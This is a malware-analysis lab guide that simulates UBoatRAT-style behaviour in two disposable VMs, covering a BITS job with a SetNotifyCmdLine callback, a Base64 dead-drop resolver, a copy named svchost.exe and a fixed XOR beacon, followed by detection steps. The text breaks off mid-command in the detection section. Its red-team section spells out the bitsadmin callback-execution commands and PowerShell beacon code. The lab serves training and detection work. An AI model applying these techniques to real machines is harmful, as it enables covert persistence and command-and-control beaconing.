![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# UBoatRAT — BITS Job Abuse, Dead-Drop Resolution, and One-Shot Beacon Analysis

## Windows VM · Ubuntu VM

## Objective

In this lab, you will reconstruct a restricted, benign simulation of UBoatRAT-style behavior through dynamic analysis.

You will investigate how a suspicious executable:

- creates a BITS download job;
- uses `SetNotifyCmdLine` to launch a callback after the transfer;
- retrieves an encoded endpoint from a controlled dead-drop resolver;
- copies itself under the system-like name `svchost.exe` in a user-writable directory;
- sends one fixed XOR-encoded beacon to a private Ubuntu VM;
- leaves process, network, file-system, BITS, Sysmon, and Windows Security telemetry behind.

You will then reproduce the individual mechanisms manually and build detection logic around the observed evidence.

> [!IMPORTANT]
> This lab does **not** distribute or execute UBoatRAT malware.
>
> `WinSvcHelper.exe` is a purpose-built educational simulator. It does not implement:
>
> - remote command execution;
> - an interactive shell;
> - credential collection;
> - system reconnaissance;
> - file collection or exfiltration;
> - HTTP upload;
> - scheduled-task persistence;
> - registry-based persistence;
> - a command-and-control response channel.
>
> The simulator sends one fixed benign message and never reads a response.

---

## Scenario

Your SOC has isolated a Windows 11 workstation after an analyst discovered an unsigned executable named `WinSvcHelper.exe`.

The analyst launched it once and reported that no window appeared and no visible output was produced. The endpoint and a second Ubuntu VM are now available for controlled investigation.

You will work through the same evidence from three operational perspectives:

- **Part I — Behavioral Analysis:** determine what the executable does from observable evidence;
- **Part II — Technique Reproduction:** reproduce the BITS callback, resolver, and beacon mechanisms manually;
- **Part III — Detection Engineering:** build host and network detections from the resulting telemetry.

The two VMs are disposable. Their setup scripts were run before the shared snapshot was created. When the lab session is closed, both VMs revert to that snapshot.

---

## Laboratory Architecture

```text
Windows VM                                      Ubuntu VM
----------                                      ---------

WinSvcHelper.exe
      |
      +--> runtime\svchost.exe
      |
      +--> runtime\init.bat
                  |
                  +--> bitsadmin.exe
                          |
                          +--> BITS download
                                  |
                                  +---- HTTP/8080 ----> /c2/trigger.dat
                                  |
                                  +--> notify callback
                                          |
                                          +--> runtime\svchost.exe
                                               --bits-callback
                                                   |
                                                   +---- HTTP/8080 ---->
                                                   |     /resolver/README.md
                                                   |
                                                   +---- TCP/9001 ----->
                                                         fixed XOR beacon
```

Ubuntu exposes only:

```text
GET/HEAD /health
GET/HEAD /c2/trigger.dat
GET/HEAD /resolver/README.md
TCP/9001 fixed-beacon receiver
```

The server rejects HTTP upload methods and does not return commands over TCP.

---

## Relevant Concepts

### BITS jobs

Background Intelligent Transfer Service is a native Windows service for asynchronous file transfers. Applications register jobs with BITS, and the service performs the network transfer in the background.

A BITS job contains:

- a display name;
- a transfer type;
- one or more remote and local file paths;
- a current state;
- optional notification behavior.

The simulator creates a download job named:

```text
UBoatLab_Persistence
```

The name is an observable training indicator. It is not intended to represent a production naming convention.

### `SetNotifyCmdLine`

A BITS job may register a program and arguments to execute when the transfer reaches a notification state.

The simulator registers:

```text
C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime\svchost.exe
```

with:

```text
--bits-callback
```

The callback is therefore launched by the BITS workflow rather than as a direct long-lived child of the original simulator.

### Dead-drop resolver

The Ubuntu server publishes:

```text
/resolver/README.md
```

The file contains a marker in this format:

```text
[Rudeltaktik]<BASE64_VALUE>!
```

The Base64 value decodes to:

```text
<UBUNTU_PRIVATE_IP>:9001
```

The simulator accepts the decoded target only when:

- it is IPv4;
- it is inside an RFC1918 private range;
- it matches the address resolved for `uboat-c2.test`;
- the port is exactly `9001`.

### Fixed beacon

The callback sends only:

```text
488|UBOATRAT_LAB|BENIGN_BEACON|NO_COMMAND_CHANNEL
```

Each byte is XOR-encoded with:

```text
0x88
```

The Ubuntu server decodes the data, validates the exact fixed message, logs it, and closes the connection without replying.

---

## ATT&CK-Oriented Behavior Mapping

| Behavior demonstrated in this lab | ATT&CK technique |
|---|---|
| Creation and use of a BITS job | T1197 — BITS Jobs |
| Download of an inert remote file | T1105 — Ingress Tool Transfer |
| Retrieval of an encoded endpoint from a hosted text resource | T1102.001 — Dead Drop Resolver |
| Copying an executable under the name `svchost.exe` outside Windows directories | T1036 — Masquerading |

> [!NOTE]
> This table maps the behaviors reproduced by this simulator. It is not a complete mapping of every behavior attributed to historical UBoatRAT samples.

---

# PART I — BEHAVIORAL ANALYSIS

*You are the malware analyst. Build the behavioral picture from evidence before reading the simulator source.*

---

## Phase 1 — Initialize the Lab Session

### Step 1 — Start the Ubuntu server manually

On the Ubuntu VM, identify the private address used to communicate with Windows:

```bash
ip -brief -4 address show scope global
```

<img width="382" height="400" alt="image" src="https://github.com/user-attachments/assets/4c028299-7761-4b62-9255-904163c9e3b3" />
<br>
<img width="592" height="105" alt="image" src="https://github.com/user-attachments/assets/aa9f74a0-18fb-48ce-9814-b9ced4380dab" />

Record it as `<UBUNTU_PRIVATE_IP>`. In this case it is `10.10.93.225`. 

Start the server. Don't forget to replace **<UBUNTU_PRIVATE_IP>** with your actual IP:

```bash
cd ~/BnB/UBoatRAT

python3 ubuntu_c2_server.py \
  --bind <UBUNTU_PRIVATE_IP> \
  --advertise-ip <UBUNTU_PRIVATE_IP>
```

Leave this terminal open for the entire lab session.

<img width="1081" height="391" alt="image" src="https://github.com/user-attachments/assets/58aa3b24-15b4-4138-817e-bada601cc88d" />

From a second Ubuntu terminal, confirm that both ports are listening. You can resize the terminals to fit on the screen:

<img width="300" height="304" alt="image" src="https://github.com/user-attachments/assets/cc9555ec-80c6-4520-af53-af4ddcba9773" />

```bash
ss -lntp |
  grep -E ':(8080|9001)\b'
```

<img width="850" height="105" alt="image" src="https://github.com/user-attachments/assets/9e611c92-e9d9-433e-ae7b-abfded785ab7" />

### Step 2 — Initialize Windows

Open **Windows PowerShell 5.1 as Administrator**.

<img width="533" height="283" alt="image" src="https://github.com/user-attachments/assets/a72f555d-992c-4dc8-8345-825af43fe651" />

```powershell
cd "C:\Users\Administrator\Desktop\Labs\UBoatRAT"

.\lab_start.ps1 -UbuntuIP <UBUNTU_PRIVATE_IP>
```

The script:

- validates the Ubuntu address as RFC1918;
- maps `uboat-c2.test` to the Ubuntu address;
- verifies TCP/8080 and TCP/9001;
- verifies `/health`, `/c2/trigger.dat`, and `/resolver/README.md`;
- removes only previous UBoatRAT runtime artifacts;
- removes only the `UBoatLab_Persistence` BITS job;
- enables the BITS Operational log;
- enables Security Event ID 4688 with command-line recording;
- applies `sysmon_uboatrat.xml` for the current disposable VM session;
- writes `lab_session.json`;
- does **not** execute `WinSvcHelper.exe`.

Wait until the script reports successful initialization.

<img width="1129" height="598" alt="image" src="https://github.com/user-attachments/assets/1800ee16-b8cd-430f-b5a9-4c4cc832ac05" />

### Step 3 — Record the session information

In *Powershell*:

```powershell
Get-Content .\lab_session.json |
  ConvertFrom-Json |
  Format-List
```

<img width="855" height="440" alt="image" src="https://github.com/user-attachments/assets/a3ef6074-f91d-469b-b681-3a3cd995ef19" />

Store the session start time for later event queries:

```powershell
$Session = Get-Content .\lab_session.json |
  ConvertFrom-Json

$SessionStart = [datetime]$Session.SessionStartUtc
$UbuntuIP = $Session.UbuntuIP
```

<img width="869" height="498" alt="image" src="https://github.com/user-attachments/assets/32cbf7aa-0f6d-4947-90d5-0e1f7ee7908a" />

---

## Phase 2 — Establish a Clean Baseline

### Step 1 — Inspect the suspicious executable

```powershell
Get-Item .\WinSvcHelper.exe |
  Select-Object Name, Length, CreationTime, LastWriteTime

Get-FileHash .\WinSvcHelper.exe -Algorithm SHA256

Get-AuthenticodeSignature .\WinSvcHelper.exe |
  Select-Object Status, StatusMessage

(Get-Item .\WinSvcHelper.exe).VersionInfo
```

Record:

- file size;
- SHA-256;
- signing status;
- version metadata;
- timestamps.

<img width="1885" height="698" alt="image" src="https://github.com/user-attachments/assets/1f9f40b8-9404-40a8-ae9f-9b180b3f461d" />

### Step 2 — Confirm that no runtime exists

In *Powershell*:

```powershell
Test-Path .\runtime
```

Expected baseline:

<img width="640" height="70" alt="image" src="https://github.com/user-attachments/assets/46d5095b-b906-4122-890d-76ecdc4cdc61" />

**OPTIONAL**: Also verify that no previous session artifacts remain:

```powershell
@(
  ".\runtime",
  ".\UBoatRAT_Lab_Blocked.log"
) |
  ForEach-Object {
    [pscustomobject]@{
      Path   = $_
      Exists = Test-Path $_
    }
  }
```

### Step 3 — Baseline the specific BITS job

In *Powershell*:

```powershell
Import-Module BitsTransfer

Get-BitsTransfer -AllUsers |
  Where-Object {
    $_.DisplayName -eq "UBoatLab_Persistence"
  } |
  Format-List *
```

Expected baseline: no matching job.

<img width="728" height="163" alt="image" src="https://github.com/user-attachments/assets/8be69233-e8d4-46b0-a27e-9d4dc28fa48e" />

A read-only full queue view is also available:

```powershell
bitsadmin /list /allusers
```

Do not cancel unrelated jobs.

<img width="716" height="160" alt="image" src="https://github.com/user-attachments/assets/0e23fbf2-2118-4769-9488-0f6d95464452" />

### Step 4 — Open Process Monitor

In *Powershell*, start *Procmon*:

>[!IMPORTANT]
>Make sure you are in the *Lab Directory* (C:\Users\Administrator\Desktop\Labs\UBoatRAT) :

```powershell
.\tools\Procmon\Procmon64.exe
```

Allow Procmon to collect normal system activity for approximately ten seconds. Pause capture with **CTRL+E**.

<img width="919" height="721" alt="image" src="https://github.com/user-attachments/assets/b918dd02-b7d6-4ef1-8e3f-ff5280c497f3" />

Do not clear the existing events yet. Do not close Procmon.

### Step 5 — Open Process Explorer

Start in Powershell:

```powershell
.\tools\ProcessExplorer\procexp64.exe
```

<img width="1803" height="761" alt="image" src="https://github.com/user-attachments/assets/e91ee8d7-486c-4e23-9433-303fbc0f0005" />

Enable these columns where available:

- Process;
- PID;
- Parent PID;
- Command Line;
- Image Path;
- Company Name.

<img width="799" height="607" alt="image" src="https://github.com/user-attachments/assets/016e9eb8-686b-4f99-b48b-4613a8e715fb" />

The callback process may be short-lived. Process Explorer is supplementary; Sysmon and Procmon provide persistent evidence after the process exits.

### Step 6 — Start packet capture

Open Wireshark and select the Windows interface that communicates with Ubuntu.

<img width="554" height="300" alt="image" src="https://github.com/user-attachments/assets/54b5fc16-ab57-44b9-ae8e-25632afb34e9" />

<img width="749" height="580" alt="image" src="https://github.com/user-attachments/assets/14034649-7f49-4f8e-baff-fb3e36948bc0" />

Apply:

```text
ip.addr == <UBUNTU_PRIVATE_IP> &&
(tcp.port == 8080 || tcp.port == 9001)
```

The Packet Capture should start automatically.

<img width="958" height="634" alt="image" src="https://github.com/user-attachments/assets/8bbb3269-78a9-4783-a550-ff95baa25a54" />

On Ubuntu, a parallel capture may be used. Open up an Ubuntu Shell and type:

<img width="382" height="400" alt="image" src="https://github.com/user-attachments/assets/4c028299-7761-4b62-9255-904163c9e3b3" />

```bash
sudo tcpdump -ni any \
  "host <WINDOWS_PRIVATE_IP> and (tcp port 8080 or tcp port 9001)" \
  -w ~/BnB/UBoatRAT/captures/uboatrat_lab.pcap
```

<img width="1032" height="179" alt="image" src="https://github.com/user-attachments/assets/73055e48-593d-45d4-baa0-63c4f2c43cf5" />

>[!NOTE]
>A parallel capture is useful when trying to determine what packets reached the Ubuntu C2 Server. 
>You will need to determine the **Windows IP Address** by typing `ipconfig` in powershell. The address is in the "IPv4 Address" row of the "Ethernet adapter Ethernet" section.
>Replace the **<WINDOWS_PRIVATE_IP>** placeholder with your actual IP.

---

## Phase 3 — Execute and Capture

Resume Procmon with **CTRL+E**.

Confirm Wireshark is still capturing.

From the Administrator PowerShell:

```powershell
cd "C:\Users\Administrator\Desktop\Labs\UBoatRAT"

.\WinSvcHelper.exe
```

The program is built as a windowless executable. It may return no terminal output.

Wait approximately 30 seconds.

Then:

- pause Procmon with **CTRL+E**;
- stop Wireshark;
- leave the Ubuntu server running.

Check whether the runtime directory now exists:

```powershell
Get-ChildItem .\runtime -Force |
  Select-Object Name, Length, LastWriteTime
```

<!-- SCREENSHOT PLACEHOLDER:
PowerShell showing the runtime directory and its generated artifacts.
-->

---

## Phase 4 — Reconstruct the Process Chain

### Step 1 — Use Procmon Process Tree

In Procmon:

```text
Tools → Process Tree
```

Locate:

```text
WinSvcHelper.exe
```

Identify its direct descendants.

Expected initial execution chain:

```text
powershell.exe
└── WinSvcHelper.exe
    └── cmd.exe
        └── bitsadmin.exe
```

The callback is a separate execution caused by the BITS workflow:

```text
runtime\svchost.exe --bits-callback
```

It may not appear as a direct child of the original simulator.

<!-- SCREENSHOT PLACEHOLDER:
Procmon Process Tree showing WinSvcHelper.exe, cmd.exe, and bitsadmin.exe.
-->

### Step 2 — Filter Procmon

Open the filter dialog with **CTRL+L**.

Add include rules for:

```text
Process Name is WinSvcHelper.exe
Process Name is cmd.exe
Process Name is bitsadmin.exe
Process Name is svchost.exe
```

Also add:

```text
Path contains \Desktop\Labs\UBoatRAT\
```

Review:

- `Process Create`;
- `Process Start`;
- file creation;
- file writes;
- reads from `init.bat`;
- operations involving `runtime`.

### Step 3 — Query Sysmon Event ID 1

```powershell
Get-WinEvent -FilterHashtable @{
  LogName   = "Microsoft-Windows-Sysmon/Operational"
  Id        = 1
  StartTime = $SessionStart
} |
  ForEach-Object {
    $Xml = [xml]$_.ToXml()
    $Data = $Xml.Event.EventData.Data

    [pscustomobject]@{
      Time        = $_.TimeCreated
      Image       = ($Data | Where-Object Name -eq "Image")."#text"
      CommandLine = ($Data | Where-Object Name -eq "CommandLine")."#text"
      ParentImage = ($Data | Where-Object Name -eq "ParentImage")."#text"
      ProcessGuid = ($Data | Where-Object Name -eq "ProcessGuid")."#text"
    }
  } |
  Sort-Object Time |
  Format-Table -AutoSize -Wrap
```

Identify:

- the original simulator;
- `cmd.exe` executing `runtime\init.bat`;
- `bitsadmin.exe` commands containing `UBoatLab_Persistence`;
- `runtime\svchost.exe --bits-callback`.

### Questions

- [ ] Which process started the execution chain?
- [ ] Which process created the BITS job?
- [ ] What command line launched the callback?
- [ ] Why is the callback not necessarily a direct child of the original simulator?
- [ ] Which executable is named `svchost.exe`, and where is it located?

---

## Phase 5 — Analyze File-System Artifacts

List the generated runtime:

```powershell
Get-ChildItem .\runtime -Force |
  Sort-Object LastWriteTime |
  Select-Object LastWriteTime, Length, Name
```

Expected artifacts may include:

```text
runtime\svchost.exe
runtime\UBoatRAT_LAB.marker
runtime\init.bat
runtime\bitsadmin.log
runtime\execution.log
runtime\uboat_lab_trigger.dat
runtime\callback.log
runtime\resolver_response.txt
runtime\beacon.sent
```

An `error.log` may appear if execution failed.

### Step 1 — Inspect the generated BITS bootstrap

```powershell
Get-Content .\runtime\init.bat
```

Locate:

```text
/create /download
/addfile
/setnotifycmdline
/resume
```

Record:

- job name;
- source URL;
- destination path;
- callback executable;
- callback arguments.

<!-- SCREENSHOT PLACEHOLDER:
init.bat open in PowerShell or a text editor with the BITS commands visible.
-->

### Step 2 — Inspect command output

```powershell
Get-Content .\runtime\bitsadmin.log
```

Look for:

- job creation result;
- file registration result;
- callback registration result;
- resume result;
- errors.

### Step 3 — Inspect simulator logs

```powershell
Get-Content .\runtime\execution.log
Get-Content .\runtime\callback.log
```

Check for:

- resolved private address;
- copied executable path;
- callback start;
- resolver download;
- decoded endpoint;
- fixed beacon result;
- confirmation that no response was read.

### Step 4 — Query Sysmon Event ID 11

```powershell
Get-WinEvent -FilterHashtable @{
  LogName   = "Microsoft-Windows-Sysmon/Operational"
  Id        = 11
  StartTime = $SessionStart
} |
  ForEach-Object {
    $Xml = [xml]$_.ToXml()
    $Data = $Xml.Event.EventData.Data

    [pscustomobject]@{
      Time           = $_.TimeCreated
      Image          = ($Data | Where-Object Name -eq "Image")."#text"
      TargetFilename = ($Data | Where-Object Name -eq "TargetFilename")."#text"
      ProcessGuid    = ($Data | Where-Object Name -eq "ProcessGuid")."#text"
    }
  } |
  Sort-Object Time |
  Format-Table -AutoSize -Wrap
```

### Questions

- [ ] Which files were created before the BITS transfer started?
- [ ] Which file was downloaded through BITS?
- [ ] Which process created each artifact?
- [ ] Why is `runtime\svchost.exe` suspicious despite its familiar name?
- [ ] What purpose does `UBoatRAT_LAB.marker` serve?

---

## Phase 6 — Analyze Network Activity

The expected network sequence is:

```text
1. BITS download:
   GET /c2/trigger.dat over TCP/8080

2. Callback resolver request:
   GET /resolver/README.md over TCP/8080

3. Fixed beacon:
   TCP connection to port 9001
```

### Step 1 — Isolate the BITS transfer

In Wireshark, apply:

```text
http.request.uri == "/c2/trigger.dat"
```

Inspect:

- source and destination IP;
- source and destination port;
- HTTP method;
- User-Agent;
- Range headers;
- response status;
- transferred size.

BITS may use HTTP Range requests. The server supports them to make the transfer observable and compatible.

<!-- SCREENSHOT PLACEHOLDER:
Wireshark packet details for GET /c2/trigger.dat,
including User-Agent and any Range header.
-->

### Step 2 — Isolate the resolver request

Apply:

```text
http.request.uri == "/resolver/README.md"
```

Follow the HTTP stream.

Record:

- User-Agent;
- response body;
- `[Rudeltaktik]` marker;
- Base64 value.

The resolver request is made by the callback simulator and uses:

```text
UBoatRAT-Lab-Simulator/1.0
```

This distinguishes it from the BITS transfer.

<!-- SCREENSHOT PLACEHOLDER:
Follow HTTP Stream output for /resolver/README.md.
-->

### Step 3 — Inspect the TCP/9001 connection

Apply:

```text
tcp.port == 9001
```

Follow the TCP stream or export the client payload as raw bytes.

The bytes are not plaintext because each byte is XORed with `0x88`.

The server does not send an application-layer response.

### Step 4 — Query Sysmon Event ID 3

```powershell
Get-WinEvent -FilterHashtable @{
  LogName   = "Microsoft-Windows-Sysmon/Operational"
  Id        = 3
  StartTime = $SessionStart
} |
  ForEach-Object {
    $Xml = [xml]$_.ToXml()
    $Data = $Xml.Event.EventData.Data

    [pscustomobject]@{
      Time                = $_.TimeCreated
      Image               = ($Data | Where-Object Name -eq "Image")."#text"
      SourceIp            = ($Data | Where-Object Name -eq "SourceIp")."#text"
      DestinationIp       = ($Data | Where-Object Name -eq "DestinationIp")."#text"
      DestinationHostname = ($Data | Where-Object Name -eq "DestinationHostname")."#text"
      DestinationPort     = ($Data | Where-Object Name -eq "DestinationPort")."#text"
      ProcessGuid         = ($Data | Where-Object Name -eq "ProcessGuid")."#text"
    }
  } |
  Sort-Object Time |
  Format-Table -AutoSize -Wrap
```

### Questions

- [ ] Which request was generated by BITS?
- [ ] Which request was generated by the callback simulator?
- [ ] Which process connected to TCP/9001?
- [ ] Did the Ubuntu server send any commands or payloads back?
- [ ] What evidence proves this is a one-way beacon rather than an interactive channel?

---

## Phase 7 — Analyze the BITS Job

### Step 1 — Inspect the live queue

```powershell
Get-BitsTransfer -AllUsers |
  Where-Object {
    $_.DisplayName -eq "UBoatLab_Persistence"
  } |
  Format-List *
```

Also inspect:

```powershell
bitsadmin /getinfo "UBoatLab_Persistence" /verbose
```

Depending on the current state and Windows build, the job may be transferred, acknowledged, completed, or retained for notification behavior.

### Step 2 — Query the BITS Operational log

First, enumerate all BITS events from this session without assuming event IDs:

```powershell
Get-WinEvent -FilterHashtable @{
  LogName   = "Microsoft-Windows-Bits-Client/Operational"
  StartTime = $SessionStart
} |
  Sort-Object TimeCreated |
  Select-Object TimeCreated, Id,
    @{Name="Summary"; Expression={
      ($_.Message -split "\r?\n" |
        Select-Object -First 4) -join " | "
    }} |
  Format-Table -AutoSize -Wrap
```

During the dry run, identify the event IDs that represent:

- job creation;
- transfer start;
- transfer completion;
- notification execution;
- errors or retries.

> [!NOTE]
> Current Windows builds commonly produce transfer-related BITS Operational events such as IDs 59 and 60, but the final screenshots and event-specific instructions should be confirmed against the actual VM build used by the platform.

### Step 3 — Search by job name

```powershell
Get-WinEvent -FilterHashtable @{
  LogName   = "Microsoft-Windows-Bits-Client/Operational"
  StartTime = $SessionStart
} |
  Where-Object {
    $_.Message -match "UBoatLab_Persistence"
  } |
  Sort-Object TimeCreated |
  Format-List TimeCreated, Id, Message
```

### Questions

- [ ] What is the BITS job name?
- [ ] What is its transfer type?
- [ ] What remote URL was registered?
- [ ] What local destination was registered?
- [ ] What callback program and arguments were registered?
- [ ] Which BITS events correspond to the transfer lifecycle on this VM build?

<!-- SCREENSHOT PLACEHOLDER:
Event Viewer or PowerShell showing the BITS job lifecycle for UBoatLab_Persistence.
-->

---

## Phase 8 — Decode the Resolver and Beacon

### Step 1 — Inspect the saved resolver

```powershell
$ResolverContent = Get-Content `
  .\runtime\resolver_response.txt `
  -Raw

$ResolverContent
```

Extract and decode the Base64 value:

```powershell
$Match = [regex]::Match(
  $ResolverContent,
  "\[Rudeltaktik\](?<Value>[A-Za-z0-9+/=]+)!"
)

if (-not $Match.Success) {
  throw "Resolver marker not found."
}

$DecodedEndpoint = [Text.Encoding]::ASCII.GetString(
  [Convert]::FromBase64String(
    $Match.Groups["Value"].Value
  )
)

$DecodedEndpoint
```

Expected format:

```text
<UBUNTU_PRIVATE_IP>:9001
```

### Step 2 — Decode captured beacon bytes

Export the client payload from the TCP/9001 stream as raw bytes, or use the Ubuntu log to confirm receipt.

Given a raw byte array named `$EncodedBeacon`:

```powershell
$DecodedBytes = New-Object byte[] $EncodedBeacon.Length

for ($Index = 0; $Index -lt $EncodedBeacon.Length; $Index++) {
  $DecodedBytes[$Index] = $EncodedBeacon[$Index] -bxor 0x88
}

[Text.Encoding]::ASCII.GetString($DecodedBytes)
```

Expected result:

```text
488|UBOATRAT_LAB|BENIGN_BEACON|NO_COMMAND_CHANNEL
```

### Step 3 — Inspect Ubuntu evidence

On Ubuntu:

```bash
cat ~/BnB/UBoatRAT/logs/server.log
cat ~/BnB/UBoatRAT/logs/beacon.log
```

<!-- SCREENSHOT PLACEHOLDER:
Ubuntu beacon.log showing the validated fixed beacon.
-->

### Questions

- [ ] What endpoint did the dead-drop resolver contain?
- [ ] Why is the resolver value encoded rather than stored as plaintext?
- [ ] What XOR key was used?
- [ ] What did the beacon decode to?
- [ ] What data about the Windows host was included?
- [ ] Did the client read a response?

---

## Phase 9 — Evidence Summary

Complete the table before moving to manual reproduction.

| Question | Finding |
|---|---|
| Initial executable | |
| Direct child process | |
| BITS utility used | |
| BITS job name | |
| Remote trigger URL | |
| Local trigger destination | |
| Callback executable | |
| Callback arguments | |
| Resolver URL | |
| Decoded resolver endpoint | |
| Beacon destination | |
| XOR key | |
| Decoded beacon | |
| Data collected from the endpoint | |
| Response or command channel observed | |

### Behavioral conclusion

The simulator creates a BITS download job and registers a completion callback. The BITS service retrieves an inert trigger file from the Ubuntu VM and launches a copy of the simulator named `svchost.exe` from a user-writable runtime directory.

The callback retrieves a controlled dead-drop resolver, validates the private endpoint, and sends one fixed XOR-encoded beacon. It does not collect endpoint data, upload files, receive commands, or maintain an interactive connection.

---

# PART II — MANUAL TECHNIQUE REPRODUCTION

*You are now the red team operator. Reproduce the individual mechanisms without running the simulator again.*

---

## Phase 10 — Reproduce a BITS Download

Use a distinct manual job name:

```text
UBoatLab_ManualDownload
```

Prepare the destination:

```powershell
New-Item .\runtime -ItemType Directory -Force |
  Out-Null

Remove-Item .\runtime\manual_trigger.dat `
  -Force `
  -ErrorAction SilentlyContinue
```

Remove only a previous copy of this specific manual job:

```powershell
Get-BitsTransfer -AllUsers |
  Where-Object {
    $_.DisplayName -eq "UBoatLab_ManualDownload"
  } |
  Remove-BitsTransfer
```

Create the job:

```powershell
bitsadmin /create /download "UBoatLab_ManualDownload"
```

Register the file:

```powershell
bitsadmin /addfile `
  "UBoatLab_ManualDownload" `
  "http://uboat-c2.test:8080/c2/trigger.dat" `
  "C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime\manual_trigger.dat"
```

Inspect before starting:

```powershell
bitsadmin /getinfo "UBoatLab_ManualDownload" /verbose
```

Start:

```powershell
bitsadmin /resume "UBoatLab_ManualDownload"
```

Poll:

```powershell
Start-Sleep -Seconds 3

bitsadmin /getinfo "UBoatLab_ManualDownload" /verbose
```

When the job reaches a transferable completion state:

```powershell
bitsadmin /complete "UBoatLab_ManualDownload"
```

Verify:

```powershell
Get-Item .\runtime\manual_trigger.dat
```

<!-- SCREENSHOT PLACEHOLDER:
bitsadmin output showing the manual download job, URL, local path, and final state.
-->

### Questions

- [ ] Which process performed the network transfer?
- [ ] Did the HTTP request use the same User-Agent as the simulator-created BITS job?
- [ ] Which BITS events appeared for the manual job?
- [ ] Which process wrote `manual_trigger.dat`?

---

## Phase 11 — Reproduce BITS Callback Execution

Use:

```text
UBoatLab_ManualCallback
```

Clean only the matching job and artifact:

```powershell
Get-BitsTransfer -AllUsers |
  Where-Object {
    $_.DisplayName -eq "UBoatLab_ManualCallback"
  } |
  Remove-BitsTransfer

Remove-Item .\runtime\manual_callback_trigger.dat `
  -Force `
  -ErrorAction SilentlyContinue

Remove-Item .\runtime\manual_callback.log `
  -Force `
  -ErrorAction SilentlyContinue
```

Create the download job:

```powershell
bitsadmin /create /download "UBoatLab_ManualCallback"
```

Register the trigger:

```powershell
bitsadmin /addfile `
  "UBoatLab_ManualCallback" `
  "http://uboat-c2.test:8080/c2/trigger.dat" `
  "C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime\manual_callback_trigger.dat"
```

Register a harmless callback:

```powershell
bitsadmin /setnotifycmdline `
  "UBoatLab_ManualCallback" `
  "C:\Windows\System32\cmd.exe" `
  '/d /c echo MANUAL_BITS_CALLBACK >> "C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime\manual_callback.log"'
```

Inspect:

```powershell
bitsadmin /getinfo "UBoatLab_ManualCallback" /verbose
```

Resume:

```powershell
bitsadmin /resume "UBoatLab_ManualCallback"
```

Wait:

```powershell
Start-Sleep -Seconds 10
```

Verify:

```powershell
Get-Content .\runtime\manual_callback.log
```

Expected:

```text
MANUAL_BITS_CALLBACK
```

<!-- SCREENSHOT PLACEHOLDER:
manual_callback.log and relevant process/event evidence showing cmd.exe launched by the BITS workflow.
-->

### Questions

- [ ] Which command was registered with `SetNotifyCmdLine`?
- [ ] Did the callback run as a direct child of your PowerShell process?
- [ ] Which telemetry source best proves that the callback executed?
- [ ] Why is callback execution more important than the inert file itself?

---

## Phase 12 — Reproduce Resolver Decoding

Retrieve the resolver manually:

```powershell
$ResolverResponse = Invoke-WebRequest `
  -Uri "http://uboat-c2.test:8080/resolver/README.md" `
  -UseBasicParsing `
  -TimeoutSec 5

$ResolverResponse.Content
```

Extract and decode:

```powershell
$Match = [regex]::Match(
  $ResolverResponse.Content,
  "\[Rudeltaktik\](?<Value>[A-Za-z0-9+/=]+)!"
)

if (-not $Match.Success) {
  throw "Resolver format is invalid."
}

$Endpoint = [Text.Encoding]::ASCII.GetString(
  [Convert]::FromBase64String(
    $Match.Groups["Value"].Value
  )
)

$Endpoint
```

Split the endpoint:

```powershell
$EndpointParts = $Endpoint -split ":", 2

$BeaconIp = $EndpointParts[0]
$BeaconPort = [int]$EndpointParts[1]

[pscustomobject]@{
  Address = $BeaconIp
  Port    = $BeaconPort
}
```

Validate that the address is RFC1918:

```powershell
$ParsedIp = [Net.IPAddress]::Parse($BeaconIp)
$Octets = $ParsedIp.GetAddressBytes()

$IsPrivate = (
  $Octets[0] -eq 10 -or
  (
    $Octets[0] -eq 172 -and
    $Octets[1] -ge 16 -and
    $Octets[1] -le 31
  ) -or
  (
    $Octets[0] -eq 192 -and
    $Octets[1] -eq 168
  )
)

if (-not $IsPrivate) {
  throw "Decoded address is not RFC1918."
}

if ($BeaconPort -ne 9001) {
  throw "Unexpected beacon port."
}
```

---

## Phase 13 — Reproduce the Fixed XOR Beacon

Build the exact fixed plaintext:

```powershell
$BeaconText = (
  "488|UBOATRAT_LAB|" +
  "BENIGN_BEACON|" +
  "NO_COMMAND_CHANNEL"
)

$PlainBytes = [Text.Encoding]::ASCII.GetBytes(
  $BeaconText
)
```

XOR each byte:

```powershell
$EncodedBytes = New-Object byte[] $PlainBytes.Length

for ($Index = 0; $Index -lt $PlainBytes.Length; $Index++) {
  $EncodedBytes[$Index] = (
    $PlainBytes[$Index] -bxor 0x88
  )
}
```

Send the fixed message to the decoded private endpoint:

```powershell
$Client = New-Object Net.Sockets.TcpClient

try {
  $Client.Connect($BeaconIp, $BeaconPort)

  $Stream = $Client.GetStream()

  try {
    $Stream.Write(
      $EncodedBytes,
      0,
      $EncodedBytes.Length
    )

    $Stream.Flush()
  }
  finally {
    $Stream.Dispose()
  }
}
finally {
  $Client.Dispose()
}
```

Do not wait for or parse a response. The Ubuntu server does not provide one.

Confirm on Ubuntu:

```bash
tail -n 20 ~/BnB/UBoatRAT/logs/beacon.log
```

### Questions

- [ ] How many bytes were transmitted?
- [ ] Why is XOR encoding not encryption?
- [ ] What makes this reproduction incapable of carrying arbitrary data?
- [ ] What prevents it from becoming an interactive command channel?

---

## Phase 14 — Compare Automated and Manual Behavior

| Automated observation | Manual reproduction |
|---|---|
| `UBoatLab_Persistence` BITS job | `UBoatLab_ManualDownload` |
| BITS download of `/c2/trigger.dat` | Manual `/addfile` and `/resume` |
| `SetNotifyCmdLine` launches `runtime\svchost.exe` | Manual harmless `cmd.exe` callback |
| Callback retrieves `/resolver/README.md` | `Invoke-WebRequest` resolver retrieval |
| Base64 endpoint decoded | Manual Base64 decoding |
| XOR-encoded fixed beacon | Manual XOR loop and TCP write |

Explain:

- what behavior belongs to BITS;
- what behavior belongs to the callback;
- what behavior belongs to the resolver;
- what behavior belongs to the TCP beacon;
- which artifacts are implementation details of the simulator rather than intrinsic BITS behavior.

---

# PART III — DETECTION ENGINEERING

*You are now the detection engineer. Build layered detections that do not depend on one event source.*

---

## Phase 15 — BITS Operational Detection

Query events from the session:

```powershell
$BitsEvents = Get-WinEvent -FilterHashtable @{
  LogName   = "Microsoft-Windows-Bits-Client/Operational"
  StartTime = $SessionStart
}

$BitsEvents |
  Sort-Object TimeCreated |
  Select-Object TimeCreated, Id,
    @{Name="Summary"; Expression={
      ($_.Message -split "\r?\n" |
        Select-Object -First 4) -join " | "
    }} |
